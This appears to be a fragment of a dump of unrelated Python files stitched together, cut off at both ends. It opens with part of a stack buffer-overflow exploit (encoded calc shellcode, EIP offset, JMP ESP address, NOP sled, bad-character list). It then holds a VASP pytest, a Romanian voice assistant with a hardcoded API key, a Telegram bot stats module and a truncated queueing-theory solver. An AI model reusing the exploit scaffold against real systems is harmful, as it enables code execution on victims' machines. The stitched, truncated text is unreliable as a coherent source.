b\"\\xc6\\x04\\x03\\x56\\xcd\\x96\\x81\\xcd\\x05\\xd4\"\nshellcode_calc += b\"\\x6a\\x2e\\xd5\\xb9\\xe3\\xcb\\xe4\\xf9\\x90\\x98\"\nshellcode_calc += b\"\\x56\\xca\\xd3\\xcd\\x5a\\xa1\\xb6\\xe5\\xe9\\xc7\"\nshellcode_calc += b\"\\x1e\\x09\\x5a\\x6d\\x79\\x24\\x5b\\xde\\xb9\\x27\"\nshellcode_calc += b\"\\xdf\\x1d\\xee\\x87\\xde\\xed\\xe3\\xc6\\x27\\x13\"\nshellcode_calc += b\"\\x09\\x9a\\xf0\\x5f\\xbc\\x0b\\x75\\x15\\x7d\\xa7\"\nshellcode_calc += b\"\\xc5\\xbb\\x05\\x54\\x9d\\xba\\x24\\xcb\\x96\\xe4\"\nshellcode_calc += b\"\\xe6\\xed\\x7b\\x9d\\xae\\xf5\\x98\\x98\\x79\\x8d\"\nshellcode_calc += b\"\\x6a\\x56\\x78\\x47\\xa3\\x97\\xd7\\xa6\\x0c\\x6a\"\nshellcode_calc += b\"\\x29\\xee\\xaa\\x95\\x5c\\x06\\xc9\\x28\\x67\\xdd\"\nshellcode_calc += b\"\\xb0\\xf6\\xe2\\xc6\\x12\\x7c\\x54\\x23\\xa3\\x51\"\nshellcode_calc += b\"\\x03\\xa0\\xaf\\x1e\\x47\\xee\\xb3\\xa1\\x84\\x84\"\nshellcode_calc += b\"\\xcf\\x2a\\x2b\\x4b\\x46\\x68\\x08\\x4f\\x03\\x2a\"\nshellcode_calc += b\"\\x31\\xd6\\xe9\\x9d\\x4e\\x08\\x52\\x41\\xeb\\x42\"\nshellcode_calc += b\"\\x7e\\x96\\x86\\x08\\x14\\x69\\x14\\x37\\x5a\\x69\"\nshellcode_calc += b\"\\x26\\x38\\xca\\x02\\x17\\xb3\\x85\\x55\\xa8\\x16\"\nshellcode_calc += b\"\\xe2\\xaa\\xe2\\x3b\\x42\\x23\\xab\\xa9\\xd7\\x2e\"\nshellcode_calc += b\"\\x4c\\x04\\x1b\\x57\\xcf\\xad\\xe3\\xac\\xcf\\xc7\"\nshellcode_calc += b\"\\xe6\\xe9\\x57\\x3b\\x9a\\x62\\x32\\x3b\\x09\\x82\"\nshellcode_calc += b\"\\x17\\x58\\xcc\\x10\\xfb\\xb1\\x6b\\x91\\x9e\\xcd\"\n\nbuf_length = 1000\neip_offset = 251\njmp_esp = 0x77ACE871\nnop_sled = \"\\x90\" * 32\n\nbadchars = [0x00, 0x0A, 0x0D]\n\npadding = \"A\" * eip_offset\neip = struct.pack(\"", "126": "import os\nimport pytest\n\ncalc = pytest.mark.calculator\n\n\n@calc('vasp')\ndef test_vasp_check_state(factory, atoms_2co):\n    \"\"\"\n    Run tests to ensure that the VASP check_state() function call works correctly,\n    i.e. correctly sets the working directories and works in that directory.\n\n    This is conditional on the existence of the VASP_COMMAND or VASP_SCRIPT\n    environment variables\n\n    \"\"\"\n\n    atoms = atoms_2co  # aliasing\n\n    # Test\n    settings = dict(xc='LDA',\n                    prec='Low',\n                    algo='Fast',\n                    ismear=0,\n                    sigma=1.,\n                    istart=0,\n                    lwave=False,\n                    lcharg=False)\n\n    s1 = atoms.get_chemical_symbols()\n\n    calc = factory.calc(**settings)\n\n    atoms.calc = calc\n\n    en1 = atoms.get_potential_energy()\n\n    # Test JSON dumping and restarting works\n    fi = 'json_test.json'\n    calc.write_json(filename=fi)\n\n    assert os.path.isfile(fi)\n\n    calc2 = factory.calc()\n    calc2.read_json(fi)\n    assert not calc2.calculation_required(atoms, ['energy', 'forces'])\n    en2 = calc2.get_potential_energy()\n    assert abs(en1 - en2) < 1e-8\n    os.remove(fi)  # Clean up the JSON file\n\n    # Check that the symbols remain in order (non-sorted)\n    s2 = calc.atoms.get_chemical_symbols()\n    assert s1 == s2\n    s3 = sorted(s2)\n    assert s2 != s3\n\n    # Check that get_atoms() doesn't reset results\n    r1 = dict(calc.results)  # Force a copy\n    calc.get_atoms()\n    r2 = dict(calc.results)\n    assert r1 == r2\n\n    # Make a parameter change to the calculator\n    calc.set(sigma=0.5)\n\n    # Check that we capture a change for float params\n    assert calc.check_state(atoms) == ['float_params']\n    assert calc.calculation_required(atoms, ['energy', 'forces'])\n\n    en2 = atoms.get_potential_energy()\n\n    # The change in sigma should result in a small change in energy\n    assert (en1 - en2) > 1e-7\n\n    # Now we make a change in input_params instead\n    calc.kpts = 2\n\n    # Check that this requires a new calculation\n    assert calc.check_state(atoms) == ['input_params']\n    assert calc.calculation_required(atoms, ['energy', 'forces'])\n\n    # Clean up\n    calc.clean()\n", "127": "#For Speech and Data recognition\r\nimport pyttsx3 # == text data into speach\r\nimport speech_recognition as sr\r\nfrom nltk.tokenize import word_tokenize\r\n\r\n#For def\r\nimport datetime\r\nimport smtplib # MAILS\r\nfrom pywhatkit import playonyt\r\nimport wikipedia\r\nfrom secret import senderemail, email_pwd\r\nfrom email.message import EmailMessage # subject sender etc\r\nimport pyautogui\r\nimport webbrowser as wb\r\nfrom time import sleep\r\nimport wikipedia as wiki\r\nfrom requests import get\r\nfrom coinmarketcapapi import CoinMarketCapAPI, CoinMarketCapAPIError\r\nimport re # (REGULAR EXPRESSIONS OR REGEX)\r\nimport os\r\nfrom decimal import Decimal\r\nimport pyperclip\r\nfrom googletrans import Translator\r\n\r\nengine = pyttsx3.init('sapi5')\r\n\r\nvoices = engine.getProperty('voices')\r\n\r\nengine.setProperty('voice', voices[1].id) # SELECTEAZA VOCEA\r\n\r\n\r\n    #MaximusAI voice setup\r\n\r\ndef speak(audio):\r\n    engine.say(audio)\r\n    engine.runAndWait()\r\n\r\ndef getvoices(voice):\r\n    voices = engine.getProperty('voices')\r\n    if voice ==1:\r\n        engine.setProperty('voice', voices[1].id)  # SELECTEAZA VOCEA\r\n        speak(\"Modul Romana activat\")\r\n    if voice ==2:\r\n        engine.setProperty('voice', voices[2].id)  # SELECTEAZA VOCEA\r\n        speak(\"English mode on\")\r\n\r\n\r\n\r\n    # Backbone for the commands\r\ndef time_funct():\r\n    Time = datetime.datetime.now().strftime('%I:%M:%S') # hour = I minutes = M seconds = S\r\n    speak(f'Ora curent\u0103 este {Time}')\r\n\r\ndef date():\r\n    dateX = datetime.datetime.now()\r\n    speak(f'Data curent\u0103 este {dateX.day}/{dateX.month}/{dateX.year}')\r\n\r\ndef greetings():\r\n    hour = datetime.datetime.now().hour\r\n    if hour >= 6 and hour <12:\r\n        speak('Bun\u0103 diminea\u021ba domnule!')\r\n    elif hour >= 12 and hour < 18:\r\n        speak('Bun\u0103 ziua domnule!')\r\n    elif hour >= 18 and hour < 24:\r\n        speak('Bun\u0103 seara domnule!')\r\n    else:\r\n        speak('Cam t\u00e2rziu nu crede\u0163i domnule?')\r\n\r\ndef send_email(receiver, subject, content):\r\n    server = smtplib.SMTP('smtp.gmail.com', 587) # this is the server for the GMAIL\r\n    server.starttls() # transmitere securizata\r\n    server.login(senderemail, email_pwd)\r\n    # server.sendmail(senderemail, to, content)\r\n    email = EmailMessage()\r\n    email['From'] = senderemail\r\n    email['To'] = receiver\r\n    email['Subject'] = subject\r\n    email.set_content(content)\r\n    server.send_message(email)\r\n    server.close()\r\n\r\ndef send_whatsapp(phone_no, message):\r\n    Message = message\r\n    wb.open(f'https://web.whatsapp.com/send?phone={phone_no}&text={Message}')\r\n    sleep(10)\r\n    pyautogui.press('enter')\r\n\r\ndef translate(word_translate): # Traducere in clipboard Google\r\n    translater = Translator()\r\n    translated_words = translater.translate(word_translate, dest='en')\r\n\r\n    pyperclip.copy(translated_words.text)\r\n    speak('Am tradus domnule')\r\n\r\ndef search_google():\r\n    speak('Ce dori\u021bi sa caut pe gug\u0103l?')\r\n    search = takeCommandMIC()\r\n    wb.open(f'https://www.google.com/search?q={search}')\r\n\r\ndef search_trading_view():\r\n    wb.open(f'https://www.tradingview.com')\r\n\r\ndef screen_shot():\r\n    dateX = datetime.datetime.now()\r\n    name_img = f'./scrennshots/{dateX.strftime(\"%d.%m.%Y-\"\"%H-%M\")}.png'\r\n    img = pyautogui.screenshot(name_img)\r\n    img.show()\r\n\r\ndef coin_market_cap():\r\n        cmc = CoinMarketCapAPI('575792ad-0824-4b28-84ad-a0eabc54530c')\r\n        btc = cmc.cryptocurrency_info(symbol='BTC')\r\n        b = btc.data\r\n        speak('Calculez informa\u021biile, dureaz\u0103 o secund\u0103')\r\n        pattern = re.compile(r'price of (Bitcoin) is (\\d+[,.]\\d{3})')\r\n\r\n        matches = pattern.finditer(b['BTC']['description'])\r\n        for match in matches:\r\n            speak(f\"{match.group(1)} are un pre\u021b de {match.group(2)}{' Dolari'}\")\r\n\r\n    # Backbone for the commands\r\n\r\n\r\ndef start_program(): # Start up functions\r\n    greetings()\r\n    speak('Numele meu este MaximusAI \u015fi sunt aici s\u0103 v\u0103 ajut')\r\n    remember_fileX = open('remember_data.txt', 'r', encoding='utf-8')\r\n    file_size = os.stat('remember_data.txt').st_size\r\n    if file_size == 0:\r\n        speak('Nu ave\u021bi nimic programat pentru ast\u0103zi')\r\n    else:\r\n        speak(f'Pentru ast\u0103zi ave\u021bi programate urm\u0103toarele, {remember_fileX.read()}')\r\n\r\n\r\n\r\ndef takeCommandMIC():    # Taking Orders and execute it\r\n    r = sr.Recognizer()\r\n    with sr.Microphone() as source:\r\n        print('Listening...')\r\n        r.pause_threshold = 1\r\n        # r.dynamic_energy_threshold = 3000\r\n        # r.adjust_for_ambient_noise(source, duration=1.5)\r\n        audio = r.listen(source)\r\n\r\n    try:\r\n        print('Recognizning...')\r\n        query = r.recognize_google(audio, language='ro')\r\n        print(query)\r\n    except Exception as e:\r\n        print(e)\r\n        # speak('Repet\u0103 te rog...')\r\n        query = ''\r\n    return query\r\n\r\n\r\n\r\nif __name__ == '__main__':\r\n    start_program()\r\n    wake_word = 'max'\r\n    while True:\r\n        query = takeCommandMIC().lower() # Taking orders with lower cases\r\n        query = word_tokenize(query)\r\n        if wake_word in query:\r\n            if 'ceasul' in query: ##########################################-----------TIME\r\n                time_funct()\r\n            if 'calculeaz\u0103' in query or 'c\u00e2t face' in query: ##########################################-----------CALCULATOR\r\n                try:\r\n                    test = query\r\n                    test1, test2 = test.remove('max'), test.remove('calculeaz\u0103')\r\n                    if 'la' in test:\r\n                        test.remove('la')\r\n                    if 3 == len(test):\r\n                        if 'ori' in test[1]:\r\n                            rez = float(test[0]) * float(test[2])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                        elif '\u00eemp\u0103r\u021bit' in test[1]:\r\n                            rez = float(test[0]) / float(test[2])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                        elif 'minus' in test[1]:\r\n                            rez = float(test[0]) - float(test[2])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                        elif 'plus' in test[1]:\r\n                            rez = float(test[0]) + float(test[2])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                    if 5 == len(test):\r\n                        if 'ori' in test[1] and 'minus' in test[3]:\r\n                            rez = float(test[0]) * float(test[2]) - float(test[4])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                        elif 'ori' in test[1] and 'ori' in test[3]:\r\n                            rez = float(test[0]) * float(test[2]) * float(test[4])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                        elif 'ori' in test[1] and '\u00eemp\u0103r\u021bit' in test[3]:\r\n                            rez = float(test[0]) * float(test[2]) / float(test[4])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                        elif 'ori' in test[1] and 'plus' in test[3]:\r\n                            rez = float(test[0]) * float(test[2]) + float(test[4])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n\r\n                        if '\u00eemp\u0103r\u021bit' in test[1] and 'minus' in test[3]:\r\n                            rez = float(test[0]) / float(test[2]) - float(test[4])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                        elif '\u00eemp\u0103r\u021bit' in test[1] and '\u00eemp\u0103r\u021bit' in test[3]:\r\n                            rez = float(test[0]) / float(test[2]) / float(test[4])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                        elif '\u00eemp\u0103r\u021bit' in test[1] and 'ori' in test[3]:\r\n                            rez = float(test[0]) / float(test[2]) * float(test[4])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                        elif '\u00eemp\u0103r\u021bit' in test[1] and 'plus' in test[3]:\r\n                            rez = float(test[0]) / float(test[2]) + float(test[4])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n\r\n                        if 'minus' in test[1] and 'minus' in test[3]:\r\n                            rez = float(test[0]) - float(test[2]) - float(test[4])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                        elif 'minus' in test[1] and '\u00eemp\u0103r\u021bit' in test[3]:\r\n                            rez = float(test[0]) - float(test[2]) / float(test[4])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                        elif 'minus' in test[1] and 'ori' in test[3]:\r\n                            rez = float(test[0]) - float(test[2]) * float(test[4])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                        elif 'minus' in test[1] and 'plus' in test[3]:\r\n                            rez = float(test[0]) - float(test[2]) + float(test[4])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                        if 'plus' in test[1] and 'minus' in test[3]:\r\n                            rez = float(test[0]) + float(test[2]) - float(test[4])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                        elif 'plus' in test[1] and '\u00eemp\u0103r\u021bit' in test[3]:\r\n                            rez = float(test[0]) + float(test[2]) / float(test[4])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                        elif 'plus' in test[1] and 'ori' in test[3]:\r\n                            rez = float(test[0]) + float(test[2]) * float(test[4])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                        elif 'plus' in test[1] and 'plus' in test[3]:\r\n                            rez = float(test[0]) + float(test[2]) + float(test[4])\r\n                            calc_str = str(round(Decimal(rez), 2))\r\n                            speak(calc_str.replace('.', 'punct'))\r\n                            pyperclip.copy(calc_str)\r\n                except:\r\n                    speak('Repeta\u021bi v\u0103 rog')\r\n\r\n            elif 'noteaz\u0103' in query: # ------------------------------- CREATE NOTES\r\n                speak('Ce dori\u021bi s\u0103 notez domnule?')\r\n                data = takeCommandMIC()\r\n                remember_file = open('remember_data.txt','a+',encoding='utf-8')\r\n                remember_file.write('\\n'+data)\r\n                remember_file.close()\r\n                speak('Am notat!')\r\n            elif 'aminte\u0219te' in query or 'aminte\u0219ti' in query or 'programat' in query: #-----------REMEMBER NOTES\r\n                remember_fileX = open('remember_data.txt','r',encoding='utf-8')\r\n                speak(remember_fileX.read())\r\n            elif '\u0219terge' in query or '\u0219tergi' in query: #-------------------------DELETE NOTES\r\n                try:\r\n                    strfx = ''.join(query)\r\n                    nr_x = int()\r\n                    if 'zero' in strfx or '0' in query:\r\n                        nr_x = 0\r\n                    if 'unu' in strfx or '1' in query:\r\n                        nr_x = 1\r\n                    if 'doi' in strfx or '2' in query:\r\n                        nr_x = 2\r\n                    if 'trei' in strfx or '3' in query:\r\n                        nr_x = 3\r\n                    if 'patru' in strfx or '4' in query:\r\n                        nr_x = 4\r\n                    if 'cinci' in strfx or '5' in query:\r\n                        nr_x = 5\r\n                    if '\u0219ase' in strfx or '6' in query:\r\n                        nr_x = 6\r\n                    if '\u0219apte' in strfx or '7' in query:\r\n                        nr_x = 7\r\n                    if 'opt' in strfx or '8' in query:\r\n                        nr_x = 8\r\n                    if 'nou\u0103' in strfx or '9' in query:\r\n                        nr_x = 9\r\n                    if 'zece' in strfx or '10' in query:\r\n                        nr_x = 10\r\n                    with open('remember_data.txt', 'r') as fr:\r\n                        # reading line by line\r\n                        lines = fr.readlines()\r\n\r\n                        # pointer for position\r\n                        ptr = 1\r\n\r\n                        # opening in writing mode\r\n                        with open('remember_data.txt', 'w') as fw:\r\n                            for line in lines:\r\n\r\n                                # remove the selected line\r\n                                if ptr != nr_x:\r\n                                    fw.write(line)\r\n                                ptr += 1\r\n\r\n                    speak('\u0218tergerea a fost efectuat\u0103 cu success!')\r\n                except:\r\n                    speak('Nu s-a putut efectua \u0219tergerea!')\r\n\r\n            elif 'trading' in query: #-----------WEB SITE TRADINGVIEW\r\n                search_trading_view()\r\n\r\n            elif 'desc\u0103rc\u0103ri' in query: #-----------FOLDER SEARCH\r\n                os.startfile(f'C:\\\\Users\\\\{os.getlogin()}\\\\Downloads') # oslogin iti ia usernameul automat\r\n\r\n            elif 'principal' in query:  #-----------FOLDER SEARCH\r\n                os.startfile(f'C:\\\\Users\\\\{os.getlogin()}')\r\n\r\n            elif 'bitcoin' in query: #-----------CRYPTO PRICE\r\n                coin_market_cap()\r\n\r\n            elif 'digi24' in query or '\u0219tire' in query: #-----------NEWS\r\n                wb.open(f'https://www.digi24.ro/')\r\n\r\n            elif 'screenshot' in query: #-----------SCREENSHOT\r\n                screen_shot()\r\n\r\n            elif 'youtube' in query: #-----------YOUTUBE\r\n                speak('Ce video dori\u021bi s\u0103 viziona\u021bi')\r\n                topic = takeCommandMIC()\r\n                playonyt(topic)\r\n\r\n            elif 'traduce' in query or 'tradu' in query or 'traducere' in query: #-------------Google Translate\r\n                speak('Ce vre\u021bi s\u0103 traduc?')\r\n                word_translate = takeCommandMIC()\r\n                translate(word_translate)\r\n\r\n            elif 'wikipedia' in query: #-----------WIKIPEDIA\r\n                speak('am \u00een\u021beles domnule, lucrez la asta')\r\n                wiki.set_lang('ro')\r\n                result = wiki.summary(query[2], sentences=3)\r\n                speak(result)\r\n\r\n            elif 'google' in query: #-----------GOOGLE\r\n                search_google()\r\n\r\n            elif 'whatsapp' in query:#-----------WHATSAPP\r\n                user_name = {\r\n                    'Lorena':'+40740303333',\r\n                    'Alex':'+40751353333',\r\n                }\r\n                try:\r\n                    speak('Desigur domnule, la cine vre\u021bi s\u0103 trimite\u021bi pe Wa\u021bap')\r\n                    name = takeCommandMIC()\r\n                    phone_number = user_name[name]\r\n                    speak('Ce dori\u021bi s\u0103 con\u021bin\u0103 mesajul domnule?')\r\n                    message = takeCommandMIC()\r\n                    send_whatsapp(phone_number, message)\r\n                    speak('Mesajul a fost trimis cu succes!')\r\n                except Exception as e:\r\n                    print(e)\r\n                    speak('Nu pot trimite mesajul')\r\n\r\n            elif 'data' in query or 'dat\u0103' in query: #---------DATA\r\n                date()\r\n\r\n            elif 'email' in query or 'mesaj' in query: #-------EMAIL\r\n                email_list = {\r\n                    'Lorena':'lorena_example@gmail.com',\r\n                    'Daniel':'daniel.mail@gmail.com'\r\n                }\r\n                try:\r\n                    speak('Desigur domnule, la cine vre\u021bi s\u0103 trimite\u021bi')\r\n                    name = takeCommandMIC()\r\n                    receiver = email_list[name]\r\n                    speak('Care este subiectul mesajului')\r\n                    subject = takeCommandMIC()\r\n                    speak('Ce dori\u021bi s\u0103 con\u021bin\u0103 mesajul domnule?')\r\n                    content = takeCommandMIC()\r\n                    send_email(receiver,subject,content)\r\n                    speak('Mesajul a fost trimis cu succes!')\r\n                except Exception as e:\r\n                    print(e)\r\n                    speak('Nu pot trimite mailul')\r\n\r\n            elif '\u00eenchide' in query or 'shutdown' in query: #--------SHUTDOWN COMPUTER\r\n                speak('\u00cenchidere activat\u0103')\r\n                os.system(\"shutdown /s /t 1\")\r\n\r\n            elif 'restart' in query: #--------RESTART COMPUTER\r\n                speak('Restart activat')\r\n                os.system(\"shutdown /r /t 1\")\r\n\r\n            elif 'pa' in query: #--------QUIT PROGRAM\r\n                speak('\u00cenchidere activat\u0103')\r\n                quit()\r\n", "128": "import command\nimport module\nimport util\n\nUSEC_PER_HOUR = 60 * 60 * 1000000\nUSEC_PER_DAY = USEC_PER_HOUR * 24\n\nclass StatsModule(module.Module):\n    name = 'Stats'\n\n    def on_load(self):\n        if 'stats' not in self.bot.config:\n            self.bot.config['stats'] = {}\n\n        keys = [\n            'sent',\n            'received',\n            'processed',\n            'replaced',\n            'sent_edits',\n            'received_edits',\n            'sent_stickers',\n            'received_stickers',\n            'uptime',\n            'spambots_banned',\n            'stickers_created'\n        ]\n\n        for k in keys:\n            if k not in self.bot.config['stats']:\n                self.bot.config['stats'][k] = 0\n\n    def on_start(self, time_us):\n        self.last_time = time_us\n\n    def on_message(self, msg):\n        if msg.from_user and msg.from_user.id == self.bot.uid:\n            base_stat = 'sent'\n        else:\n            base_stat = 'received'\n\n        stat = base_stat\n        if msg.edit_date:\n            stat += '_edits'\n\n        self.bot.config['stats'][stat] += 1\n\n        if msg.sticker:\n            stat = base_stat + '_stickers'\n            self.bot.config['stats'][stat] += 1\n\n        self.update_uptime()\n\n    def on_command(self, msg, cmd_info, args):\n        self.bot.config['stats']['processed'] += 1\n\n    def update_uptime(self):\n        now = util.time_us()\n        delta_us = now - self.last_time\n        self.bot.config['stats']['uptime'] += delta_us\n        self.last_time = now\n\n    def calc_pct(self, num1, num2):\n        if not num2:\n            return '0'\n\n        return '{:.1f}'.format((num1 / num2) * 100).rstrip('0').rstrip('.')\n\n    def calc_ph(self, stat, uptime):\n        up_hr = max(1, uptime) / USEC_PER_HOUR\n        return '{:.1f}'.format(stat / up_hr).rstrip('0').rstrip('.')\n\n    def calc_pd(self, stat, uptime):\n        up_day = max(1, uptime) / USEC_PER_DAY\n        return '{:.1f}'.format(stat / up_day).rstrip('0').rstrip('.')\n\n    @command.desc('Show chat stats (pass `reset` to reset stats)')\n    @command.alias('stat')\n    def cmd_stats(self, msg, args):\n        if args == \"reset\":\n            self.bot.config['stats'] = {}\n            self.on_load()\n            self.on_start(util.time_us())\n            return '__All stats have been reset.__'\n\n        self.update_uptime()\n        self.bot.save_config()\n\n        st = self.bot.config['stats']\n        uptime = st['uptime']\n        sent = st['sent']\n        sent_stickers = st['sent_stickers']\n        recv = st['received']\n        recv_stickers = st['received_stickers']\n        processed = st['processed']\n        replaced = st['replaced']\n        banned = st['spambots_banned']\n        stickers = st['stickers_created']\n\n        return f'''**Stats since last reset**:\n    \u2022 **Total time elapsed**: {util.format_duration_us(uptime)}\n    \u2022 **Messages received**: {recv} ({self.calc_ph(recv, uptime)}/h) \u2022 {self.calc_pct(recv_stickers, recv)}% are stickers\n    \u2022 **Messages sent**: {sent} ({self.calc_ph(sent, uptime)}/h) \u2022 {self.calc_pct(sent_stickers, sent)}% are stickers\n    \u2022 **Percent of total messages sent**: {self.calc_pct(sent, sent + recv)}%\n    \u2022 **Commands processed**: {processed} ({self.calc_ph(processed, uptime)}/h) \u2022 {self.calc_pct(processed, sent)}% of sent messages\n    \u2022 **Snippets replaced**: {replaced} ({self.calc_ph(replaced, uptime)}/h) \u2022 {self.calc_pct(replaced, sent)}% of sent messages\n    \u2022 **Spambots banned**: {banned} ({self.calc_pd(banned, uptime)}/day)\n    \u2022 **Stickers created**: {stickers} ({self.calc_pd(stickers, uptime)}/day)'''\n", "129": "import math\n\n\nclass Derivative:\n    def __init__(self, f, h=0.0001):\n        self.f = f\n        self.h = float(h)\n\n    def __call__(self, x):\n        f, h = self.f, self.h\n        return (f(x+h) - f(x-h))/(2*h)\n\n\ndef C(n, k):\n    return math.factorial(n)/(math.factorial(n-k)*math.factorial(k))\n\ndef b(value):\n    res = [0]\n    summ = 0\n    for i in range(1, value):\n        summ += i\n    for i in range(1, value):\n        res.append(i/summ)\n    return res\n\nclass Solver:\n\n    def __init__(self, a, infin=3):\n        assert 0 < a < 1\n        self.a = a\n        self.inf = infin\n        self.b = b(self.inf)\n        self.inA = 1 - a\n        self.inB = self.calc_inB()\n        self.q = []\n        self.ro = self.a*self.inB\n\n    def reload(self, a, infin=3):\n        assert 0 < a < 1\n        self.a = a\n        self.inf = infin\n        self.b = b(self.inf)\n        self.inA = 1 - a\n        self.inB = self.calc_inB()\n        self.q = []\n        self.ro = self.a*self.inB\n\n    def calc_inB(self):\n        res = 0\n        for i in range(self.inf):\n            res += i * self.b[i]\n        return res\n\n    def calc_Bi(self, i):\n        res = 0\n        for j in range(i,self.inf):\n            res += self.b[j]\n        return res\n\n    def calc_pwn(self, n):\n        assert n >= 0\n        res = 0\n        for t in range(n, self.inf):\n            res += C(t, n)*self.a**n*self.inA**(t-n)*self.b[t]\n        return res\n\n    def calc_Pwz(self, z):\n        res = 0\n        for n in range(self.inf):\n            res += z**n*self.calc_pwn(n)\n        return res\n\n    def calc_Pwi(self, i):\n        res = 0\n        for j in range(i, self.inf):\n            res += self.calc_pwn(j)\n        return res\n\n    def calc_betaz(self, z):\n        summ = 0\n        for n in range(self.inf):\n            summ+= z**n*self.b[n]\n        return summ\n\n    def calc_qplusi(self, i):\n        while len(self.q)<=i:\n            self.q.append(None)\n        if self.q[i]:\n            return self.q[i]\n        else:\n            tmp = 0\n            for j in range(1, i):\n                tmp += self.calc_qplusi(j)*self.calc_Pwi(i-j+1)\n            self.q[i] = (self.calc_Pwi(i)+tmp)/self.calc_pwn(0)\n            return self.q[i]\n\n    def calc_pplusi(self, i):\n        if i == 0:\n            summ = 0\n            for j in range(1,self.inf):\n                summ+=self.calc_qplusi(j)\n            return 1/(1+summ)\n        else:\n            return self.calc_pplusi(0)*self.calc_qplusi(i)\n\n    def calc_Pplusz(self, z):\n        # assert 0 < z < 1\n        return (1-z)*self.calc_Pwz(z)*(1-self.a*self.inB)/(self.calc_Pwz(z)-z)\n\n    def calc_phat(self, i):\n        assert i>=1\n        if i == 1:\n            return self.calc_pplusi(0) + self.calc_pplusi(1)\n        else:\n            return self.calc_pplusi(i)\n\n    def calc_pi(self, i):\n        if i == 0:\n            return self.calc_pplusi(0)\n        else:\n            summ = 0\n            for n in range(0, self.inf):\n                for j in range(max(1,i-n), i+1):\n                    summ += self.calc_phat(j)*self.calc_Bi(n+1)*C(n,i-j)*self.a**(i-j)*self.inA**(n-i+j)\n            return self.a*summ\n\n    def check_pi(self, i):\n        summ1, summ2 = 0, 0\n        for n in range(i-1, self.inf):\n            summ1 += self.calc_Bi(n+1)*C(n,i-1)*self.a**(i-1)*self.inA**(n-i+1)\n        for j in range(1,i+1):\n            summ3 = 0\n            for n in range(i-j,self.inf):\n                self.calc_Bi(n+1)*C(n,i-j)*self.a**(i-j)*self.inA**(n-i+j)\n            summ2+=self.calc_pplusi(i)*summ3\n        return self.a*(self.calc_pplusi(0)*summ1+summ2)\n\n    def calc_Pz(self, z):\n        return (1 - self.calc_Pwz(z))*((self.calc_Pplusz(z)-self.calc_pplusi(0)) \\\n                                       +z*self.calc_pplusi(0))/(1-z)+self.calc_pplusi(0)\n\n    def calc_pxi(self, i):\n        if i == 0:\n            return self.calc_pplusi(0)/self.inA\n        else:\n            summ1, summ2, summ3, summ4 = 0, 0, 0, 0\n            for n in range(i,self.inf):\n                summ1 += self.calc_Bi(n+1)*C(n-1,i-1)*self.a**(i-1)*self.inA**(n-i)\n\n            for j in range(1,i+1):\n                summ = 0\n                for n in range(i-j+1, self.inf):\n                    summ+= self.calc_Bi(n+1)*C(n-1,i-j)*self.a**(i-j)*self.inA**(n-i+j-1)\n                summ2+=self.calc_pplusi(j)*summ\n\n            for n in range(i+1, self.inf):\n                summ3 += self.b[n]*C(n-1,i)*self.a**i*self.inA**(n-i-1)\n\n            for j in range(1,i+2):\n                summ = 0\n                for n in range(i-j+2, self.inf):\n                    summ += self.b[n]*C(n-1,i-j+1)*self.a**(i-j+1)*self.inA**(n-i+j-2)\n                summ4 += self.calc_pplusi(j)*summ\n\n            return self.a*(self.calc_pplusi(0)*summ1+summ2)+self.a*self.calc_pplusi(0)*summ3+self.a*summ4\n\n    def calc_Pxz(self, z):\n        res = 0\n        for i in range(self.inf):\n            res += z**i*self.calc_pxi(i)\n        return res\n\n    def check_Pxz(self, z):\n        return self.calc_pplusi(0)/self.inA + \\\n    self.a*self.calc_pplusi(0)*z*\\\n               ((self.a*z+self.inA)-self.calc_betaz(self.a*z+self.inA))/\\\n               ((self.a*z+self.inA)*(1-(self.a*z+self.inA)))+\\\n    self.a*(self.calc_Pplusz(z)-self.calc_pplusi(0))*\\\n               ((self.a*z+self.inA)-self.calc_betaz(self.a*z+self.inA))/\\\n               